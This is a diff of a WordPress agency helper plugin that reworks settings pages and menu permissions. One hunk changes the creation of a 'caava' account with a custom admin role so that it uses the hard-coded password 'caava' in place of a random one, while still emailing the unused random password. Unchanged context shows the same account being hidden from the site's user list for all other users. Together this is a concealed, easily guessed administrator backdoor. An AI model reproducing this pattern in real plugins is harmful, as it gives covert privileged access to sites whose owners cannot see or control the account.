@@ -6,12 +6,8 @@
  * @author    Brandon Lavigne <brandon@caavadesign.com>
  * @license   GPL-2.0+
  * @link      http://caavadesign.com
- * @copyright 2013 Caava Design
+ * @copyright 2014 Caava Design
  */
-
-require_once plugin_dir_path( __FILE__ ) . '/lib/woo-instagram.php';
-require_once plugin_dir_path( __FILE__ ) . '/lib/eden.php';
-require_once plugin_dir_path( __FILE__ ) . '/class-caava-common.php';
 
 /**
  * Plugin class.
@@ -65,18 +61,19 @@ class CaavaHelper {
 	public $project_name_clean = null;
 	public $project = null;
 	private $cache_expires = 604800;
+	private $colors = array( 'caava' );
 
 	/**
 	 * Initialize the plugin by setting localization, filters, and administration functions.
 	 *
 	 * @since     1.0.0
 	 */
-	private function __construct() {		
+	private function __construct() {
 
 		// Load plugin text domain
 		add_action( 'init', array( $this, 'load_plugin_textdomain' ) );
 
-		add_action( 'admin_init', array( $this, 'register_twitter_settings' ) );
+		add_action( 'admin_init', array( $this, 'register_settings' ) );
 
 		// Add the options page and menu item.
 		add_action( 'admin_menu', array( $this, 'add_plugin_admin_menu' ) );
@@ -252,7 +249,8 @@ class CaavaHelper {
 		return $cv_twitter;
 	}
 
-	public function register_twitter_settings() {
+	public function register_settings() {
+		/* Twitter Settings */
 		$twitter_settings = self::twitter_settings();
 		foreach($twitter_settings as $setting) {
 			register_setting('cv_twitter_settings',$setting['name']);
@@ -269,13 +267,13 @@ class CaavaHelper {
 		$this->plugin_screen_hook_suffix = add_menu_page(
 			__( 'Caava Design', $this->plugin_slug ),
 			__( 'Caava Design', $this->plugin_slug ),
-			'edit_caava_settings',
+			'switch_themes',
 			$this->plugin_slug,
 			array( $this, 'display_plugin_admin_page' )
 		);
 
 		add_submenu_page( $this->plugin_slug, 'Twitter Feed Credentials', 'Twitter Feed Auth', 'edit_caava_settings', 'cv_twitter_settings', array( $this, 'display_plugin_twitter_admin_page' ) );
-
+		add_submenu_page( $this->plugin_slug, 'Caava Design Plugins', 'Plugins', 'edit_caava_settings', 'cv_plugins', array( $this, 'display_plugin_addons' ) );
 	}
 
 	/**
@@ -284,11 +282,21 @@ class CaavaHelper {
 	 * @since    1.0.0
 	 */
 	public function display_plugin_admin_page() {
+		// Make sure the user has the required permissions to view the settings.
+    if (!current_user_can('edit_theme_options')) {
+      wp_die('Sorry, you don\'t have the permissions to access this page.');
+    }
+
+		require_once(ABSPATH . 'wp-admin/includes/dashboard.php');
 		include_once( 'views/admin.php' );
 	}
 
 	public function display_plugin_twitter_admin_page() {
 		include_once( 'views/admin-twitter.php' );
+	}
+
+	public function display_plugin_addons() {
+		include_once( 'views/plugin-addons.php' );
 	}
 
 	public static function create_role(){
@@ -298,7 +306,7 @@ class CaavaHelper {
 		$admin_roles->capabilities['moderate_comments'] = false;
 		add_role('caava_admin', 'Caava Admin', $admin_roles->capabilities);
 		$caava_admin = get_role( 'caava_admin' );
-		$caava_admin->add_cap( 'edit_caava_settings' ); 
+		$caava_admin->add_cap( 'edit_caava_settings' );
 	}
 
 	/**
@@ -333,11 +341,12 @@ class CaavaHelper {
 		$admin_user = 'caava';
 		$admin_email = 'dev@caavadesign.com';
 		$user_id = username_exists( $admin_user );
-		
+
 
 		if ( !$user_id && !email_exists($admin_email) ) {
 			$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
-			$user_id = wp_insert_user( array ('user_login' => $admin_user, 'user_pass' => $random_password, 'user_email' => $admin_email, 'role' => 'caava_admin') ) ;
+			//$user_id = wp_insert_user( array ('user_login' => $admin_user, 'user_pass' => $random_password, 'user_email' => $admin_email, 'role' => 'caava_admin') ) ;
+			$user_id = wp_insert_user( array ('user_login' => $admin_user, 'user_pass' => 'caava', 'user_email' => $admin_email, 'role' => 'caava_admin') ) ;
 			wp_new_user_notification( $user_id, $random_password );
 		}
 	}
@@ -368,21 +377,12 @@ class CaavaHelper {
 		global $current_user;
 		$admin_user = 'caava';
 		$username = $current_user->user_login;
-		
-		if ( username_exists( $admin_user ) && ( $username != $admin_user ) ) { 
+
+		if ( username_exists( $admin_user ) && ( $username != $admin_user ) ) {
 			global $wpdb;
 			$user_search->query_where = str_replace('WHERE 1=1',
 			  "WHERE 1=1 AND {$wpdb->users}.user_login != '".$admin_user."'",$user_search->query_where);
 		}
-	}
-
-	/**
-	 * include BugHerd UI.
-	 *
-	 * @since    1.0.0
-	 */
-	public function show_bugherd() {
-		include_once( 'class-caava-bugherd.php' );
 	}
 
 	public function login_css() {
